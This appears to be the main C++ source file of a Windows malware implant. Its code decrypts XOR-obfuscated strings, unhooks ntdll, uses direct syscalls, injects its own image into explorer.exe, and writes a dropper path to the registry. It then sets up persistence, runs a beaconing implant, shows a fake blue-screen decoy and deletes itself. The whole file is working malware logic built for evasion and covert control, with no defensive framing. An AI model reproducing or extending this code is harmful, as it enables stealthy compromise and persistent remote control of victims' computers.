#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>

namespace {
    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
    std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";

    // "svchost.exe" -> \x29\x2C\x39\x32\x35\x29\x2E\x74\x3F\x22\x3F
    std::wstring kSvchost = L"\x29\x2C\x39\x32\x35\x29\x2E\x74\x3F\x22\x3F";

    // "Volatile Environment" -> \x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E
    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";

    // "DropperPath" -> \x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32
    std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";

    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess(const std::wstring& sPath) {
        if (sPath.find(utils::DecryptW(kExplorer)) != std::wstring::npos) return true;
        if (sPath.find(utils::DecryptW(kSvchost)) != std::wstring::npos) return true;
        return false;
    }

    bool IsRunningFromPersistLocation(const std::wstring& sPath) {
        if (sPath.find(L"\\appdata\\local\\") != std::wstring::npos || sPath.find(L"\\appdata\\roaming\\") != std::wstring::npos || sPath.find(L"\\programdata\\") != std::wstring::npos) {
            if (sPath.find(L"\\temp\\") == std::wstring::npos && sPath.find(L"\\tmp\\") == std::wstring::npos) {
                return true;
            }
        }
        return false;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    wchar_t currentPathBuf[MAX_PATH];
    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
    std::wstring currentPath(currentPathBuf);
    std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });

    LOG_INFO("--- WINMAIN ---");
    LOG_INFO("PATH: " + utils::ws2s(currentPath));

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 1;

    if (IsSystemProcess(currentPath)) {
        LOG_INFO("ROLE: Foothold.");
        wchar_t dropperPath[MAX_PATH] = {0};
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(dropperPath);
            if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
                Sleep(15000);
                persistence::establishPersistence(dropperPath);
            }
            RegCloseKey(hKey);
        }
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    if (IsRunningFromPersistLocation(currentPath)) {
        LOG_INFO("ROLE: Persisted.");
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    // Dropper
    LOG_INFO("ROLE: Dropper.");
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        LOG_INFO("Attempting relocation...");
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            LOG_INFO("Relocation success.");
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        }
    }

    LOG_WARN("Relocation failed. Dropping stable copy...");
    std::wstring persistPath = persistence::establishPersistence();
    if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
        LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
        STARTUPINFOW si; PROCESS_INFORMATION pi;
        RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        if (CreateProcessW(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            LOG_INFO("Stable copy active.");
        } else {
            LOG_ERR("Launch stable copy fail. Error: " + std::to_string(GetLastError()));
        }
    }

    decoy::ShowBSOD();
    CoUninitialize();
    utils::SelfDeleteAndExit();
    return 0;
}
